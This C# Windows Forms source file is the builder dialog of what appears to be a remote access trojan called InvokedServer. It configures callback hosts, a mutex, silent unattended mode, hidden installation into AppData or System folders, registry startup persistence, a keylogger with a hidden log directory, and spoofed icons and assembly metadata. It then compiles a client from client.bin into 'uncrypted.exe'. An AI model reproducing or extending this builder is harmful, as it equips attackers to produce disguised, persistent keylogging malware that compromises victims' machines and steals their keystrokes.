using InvokedCommon.DNS;
using InvokedCommon.Helpers;
using InvokedServer.Build;
using InvokedServer.Models;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
namespace InvokedServer.Forms
{
    public partial class FrmBuilder : Form
    {
        private bool _profileLoaded;
        private bool _changed;
        private readonly BindingList<Host> _hosts = new BindingList<Host>();
        private readonly HostsConverter _hostsConverter = new HostsConverter();

        public FrmBuilder() => InitializeComponent();

        #region Form Events
        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            lstHosts.DataSource = new BindingSource(_hosts, null);
            LoadProfile("Default");
            numericUpDownPort.Value = Settings.ListenPort;

            UpdateControlStates();
        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_changed && MessageBox.Show(this,
                "Do you want to save your current settings?",
                "Changes detected",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveProfile("Default");
            }
        }
        #endregion

        #region Profile Management
        private void LoadProfile(string profileName)
        {
            var builderProfile = new BuilderProfile(profileName);
            _hosts.Clear();

            foreach (var host in _hostsConverter.RawHostsToList(builderProfile.Hosts))
                _hosts.Add(host);

            txtTag.Text = builderProfile.Tag;
            numericUpDownDelay.Value = builderProfile.Delay;
            txtMutex.Text = builderProfile.Mutex;

            chkInstall.Checked = builderProfile.InstallClient;
            txtInstallName.Text = builderProfile.InstallName;
            GetInstallPath(builderProfile.InstallPath).Checked = true;
            txtInstallSubDirectory.Text = builderProfile.InstallSub;
            chkHide.Checked = builderProfile.HideFile;
            chkHideSubDirectory.Checked = builderProfile.HideSubDirectory;

            chkStartup.Checked = builderProfile.AddStartup;
            txtRegistryKeyName.Text = builderProfile.RegistryName;

            chkChangeIcon.Checked = builderProfile.ChangeIcon;
            txtIconPath.Text = builderProfile.IconPath;

            chkChangeAsmInfo.Checked = builderProfile.ChangeAsmInfo;
            txtProductName.Text = builderProfile.ProductName;
            txtDescription.Text = builderProfile.Description;
            txtCompanyName.Text = builderProfile.CompanyName;
            txtCopyright.Text = builderProfile.Copyright;
            txtTrademarks.Text = builderProfile.Trademarks;
            txtOriginalFilename.Text = builderProfile.OriginalFilename;
            txtProductVersion.Text = builderProfile.ProductVersion;
            txtFileVersion.Text = builderProfile.FileVersion;

            chkKeylogger.Checked = builderProfile.Keylogger;
            txtLogDirectoryName.Text = builderProfile.LogDirectoryName;
            chkHideLogDirectory.Checked = builderProfile.HideLogDirectory;

            _profileLoaded = true;
        }

        private void SaveProfile(string profileName)
        {
            var builderProfile = new BuilderProfile(profileName)
            {
                Tag = txtTag.Text,
                Hosts = _hostsConverter.ListToRawHosts(_hosts),
                Delay = (int)numericUpDownDelay.Value,
                Mutex = txtMutex.Text,

                InstallClient = chkInstall.Checked,
                InstallName = txtInstallName.Text,
                InstallPath = GetInstallPath(),
                InstallSub = txtInstallSubDirectory.Text,
                HideFile = chkHide.Checked,
                HideSubDirectory = chkHideSubDirectory.Checked,

                AddStartup = chkStartup.Checked,
                RegistryName = txtRegistryKeyName.Text,

                ChangeIcon = chkChangeIcon.Checked,
                IconPath = txtIconPath.Text,

                ChangeAsmInfo = chkChangeAsmInfo.Checked,
                ProductName = txtProductName.Text,
                Description = txtDescription.Text,
                CompanyName = txtCompanyName.Text,
                Copyright = txtCopyright.Text,
                Trademarks = txtTrademarks.Text,
                OriginalFilename = txtOriginalFilename.Text,
                ProductVersion = txtProductVersion.Text,
                FileVersion = txtFileVersion.Text,

                Keylogger = chkKeylogger.Checked,
                LogDirectoryName = txtLogDirectoryName.Text,
                HideLogDirectory = chkHideLogDirectory.Checked
            };
        }
        #endregion

        #region Host Management
        private void btnAddHost_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtHost.Text)) return;

            HasChanged();
            _hosts.Add(new Host()
            {
                Hostname = txtHost.Text,
                Port = (ushort)numericUpDownPort.Value
            });
            txtHost.Text = "";
        }

        private void removeHostToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();
            foreach (var selectedItem in lstHosts.SelectedItems.Cast<object>().Select(x => x.ToString()).ToList())
            {
                foreach (var host in _hosts)
                {
                    if (selectedItem == host.ToString())
                    {
                        _hosts.Remove(host);
                        break;
                    }
                }
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();
            _hosts.Clear();
        }
        #endregion

        #region Build Process
        private void btnBuild_Click(object sender, EventArgs e)
        {
            BuildOptions buildOptions;
            try
            {
                buildOptions = GetBuildOptions();
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, ex.Message, "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }

            SetBuildState(false);
            new Thread(BuildClient).Start(buildOptions);
        }

        private BuildOptions GetBuildOptions()
        {
            if (!CheckForEmptyInput())
                throw new Exception("Please fill out all required fields!");

            var buildOptions = new BuildOptions
            {
                Tag = txtTag.Text,
                Mutex = txtMutex.Text,
                UnattendedMode = true,
                RawHosts = _hostsConverter.ListToRawHosts(_hosts),
                Delay = (int)numericUpDownDelay.Value,
                Version = Application.ProductVersion,

                InstallPath = GetInstallPath(),
                InstallSub = txtInstallSubDirectory.Text,
                InstallName = txtInstallName.Text + ".exe",
                Install = chkInstall.Checked,
                HideFile = chkHide.Checked,
                HideInstallSubdirectory = chkHideSubDirectory.Checked,

                StartupName = txtRegistryKeyName.Text,
                Startup = chkStartup.Checked,

                Keylogger = chkKeylogger.Checked,
                LogDirectoryName = txtLogDirectoryName.Text,
                HideLogDirectory = chkHideLogDirectory.Checked,

                IconPath = chkChangeIcon.Checked ? txtIconPath.Text : string.Empty
            };

            if (!File.Exists("client.bin"))
                throw new Exception("Could not locate \"client.bin\" file.");

            if (buildOptions.RawHosts.Length < 2)
                throw new Exception("Please enter a valid host to connect to.");

            if (chkChangeIcon.Checked && (string.IsNullOrWhiteSpace(buildOptions.IconPath) || !File.Exists(buildOptions.IconPath)))
                throw new Exception("Please choose a valid icon path.");

            if (chkChangeAsmInfo.Checked)
            {
                if (!IsValidVersionNumber(txtProductVersion.Text))
                    throw new Exception("Please enter a valid product version number!\nExample: 1.2.3.4");

                if (!IsValidVersionNumber(txtFileVersion.Text))
                    throw new Exception("Please enter a valid file version number!\nExample: 1.2.3.4");

                buildOptions.AssemblyInformation = new string[]
                {
                    txtProductName.Text,
                    txtDescription.Text,
                    txtCompanyName.Text,
                    txtCopyright.Text,
                    txtTrademarks.Text,
                    txtOriginalFilename.Text,
                    txtProductVersion.Text,
                    txtFileVersion.Text
                };
            }

            using (var saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Title = "Save Client as";
                saveFileDialog.Filter = "Executables *.exe|*.exe";
                saveFileDialog.RestoreDirectory = true;
                saveFileDialog.FileName = "uncrypted.exe";

                if (saveFileDialog.ShowDialog() != DialogResult.OK)
                    throw new Exception("Please choose a valid output path.");

                buildOptions.OutputPath = saveFileDialog.FileName;
            }

            return buildOptions;
        }

        private void BuildClient(object o)
        {
            try
            {
                var options = (BuildOptions)o;
                new ClientBuilder(options, "client.bin").Build();

                Invoke((MethodInvoker)(() =>
                    MessageBox.Show(this,
                        $"Successfully built client! Saved to:\n{options.OutputPath}",
                        "Build Success",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Asterisk)));
            }
            catch (Exception ex)
            {
                Invoke((MethodInvoker)(() =>
                    MessageBox.Show(this,
                        $"An error occurred!\n\nError Message: {ex.Message}\nStack Trace:\n{ex.StackTrace}",
                        "Build failed",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Hand)));
            }
            finally
            {
                SetBuildState(true);
            }
        }

        private void SetBuildState(bool state)
        {
            try
            {
                Invoke((MethodInvoker)(() =>
                {
                    btnBuild.Text = state ? "Build" : "Building...";
                    btnBuild.Enabled = state;
                }));
            }
            catch (InvalidOperationException) { }
        }
        #endregion

        #region Helper Methods
        private bool CheckForEmptyInput()
        {
            if (string.IsNullOrWhiteSpace(txtTag.Text) ||
                string.IsNullOrWhiteSpace(txtMutex.Text) ||
                _hosts.Count == 0)
                return false;

            if (chkInstall.Checked && string.IsNullOrWhiteSpace(txtInstallName.Text))
                return false;

            if (chkStartup.Checked && string.IsNullOrWhiteSpace(txtRegistryKeyName.Text))
                return false;

            return true;
        }

        private void RefreshPreviewPath()
        {
            string path = string.Empty;
            string subDir = txtInstallSubDirectory.Text;
            string fileName = txtInstallName.Text;

            if (rbAppdata.Checked)
                path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), subDir, fileName);
            else if (rbProgramFiles.Checked)
                path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), subDir, fileName);
            else if (rbSystem.Checked)
                path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), subDir, fileName);

            txtPreviewPath.Text = path + ".exe";
        }

        private bool IsValidVersionNumber(string input)
        {
            return Regex.IsMatch(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$");
        }

        private short GetInstallPath()
        {
            if (rbAppdata.Checked) return 1;
            if (rbProgramFiles.Checked) return 2;
            if (rbSystem.Checked) return 3;
            throw new ArgumentException("InstallPath");
        }

        private RadioButton GetInstallPath(short installPath)
        {
            switch (installPath)
            {
                case 1: return rbAppdata;
                case 2: return rbProgramFiles;
                case 3: return rbSystem;
                default: throw new ArgumentException("InstallPath");
            }
        }

        private void UpdateControlStates()
        {
            UpdateInstallationControlStates();
            UpdateStartupControlStates();
            UpdateAssemblyControlStates();
            UpdateIconControlStates();
            UpdateKeyloggerControlStates();
        }

        private void UpdateInstallationControlStates()
        {
            bool enabled = chkInstall.Checked;
            txtInstallName.Enabled = enabled;
            rbAppdata.Enabled = enabled;
            rbProgramFiles.Enabled = enabled;
            rbSystem.Enabled = enabled;
            txtInstallSubDirectory.Enabled = enabled;
            chkHide.Enabled = enabled;
            chkHideSubDirectory.Enabled = enabled;
        }

        private void UpdateStartupControlStates()
        {
            txtRegistryKeyName.Enabled = chkStartup.Checked;
        }

        private void UpdateAssemblyControlStates()
        {
            bool enabled = chkChangeAsmInfo.Checked;
            txtProductName.Enabled = enabled;
            txtDescription.Enabled = enabled;
            txtCompanyName.Enabled = enabled;
            txtCopyright.Enabled = enabled;
            txtTrademarks.Enabled = enabled;
            txtOriginalFilename.Enabled = enabled;
            txtFileVersion.Enabled = enabled;
            txtProductVersion.Enabled = enabled;
        }

        private void UpdateIconControlStates()
        {
            bool enabled = chkChangeIcon.Checked;
            txtIconPath.Enabled = enabled;
            btnBrowseIcon.Enabled = enabled;
        }

        private void UpdateKeyloggerControlStates()
        {
            bool enabled = chkKeylogger.Checked;
            txtLogDirectoryName.Enabled = enabled;
            chkHideLogDirectory.Enabled = enabled;
        }

        private void HasChanged()
        {
            if (!_changed && _profileLoaded)
                _changed = true;
        }
        #endregion

        #region Event Handlers
        private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (e.KeyChar == '\\' || FileHelper.HasIllegalCharacters(e.KeyChar.ToString())) &&
                        !char.IsControl(e.KeyChar);
        }

        private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (e.KeyChar == '\\' || FileHelper.HasIllegalCharacters(e.KeyChar.ToString())) &&
                        !char.IsControl(e.KeyChar);
        }

        private void txtLogDirectoryName_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (e.KeyChar == '\\' || FileHelper.HasIllegalCharacters(e.KeyChar.ToString())) &&
                        !char.IsControl(e.KeyChar);
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            HasChanged();
            txtMutex.Text = Guid.NewGuid().ToString();
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateInstallationControlStates();
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateStartupControlStates();
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateAssemblyControlStates();
        }

        private void chkKeylogger_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateKeyloggerControlStates();
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Choose Icon";
                openFileDialog.Filter = "Icons *.ico|*.ico";
                openFileDialog.Multiselect = false;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = openFileDialog.FileName;
                    iconPreview.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(64, 64)).Handle);
                }
            }
        }

        private void chkChangeIcon_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateIconControlStates();
        }

        private void HasChangedSetting(object sender, EventArgs e) => HasChanged();

        private void HasChangedSettingAndFilePath(object sender, EventArgs e)
        {
            HasChanged();
            RefreshPreviewPath();
        }
        #endregion
    }
}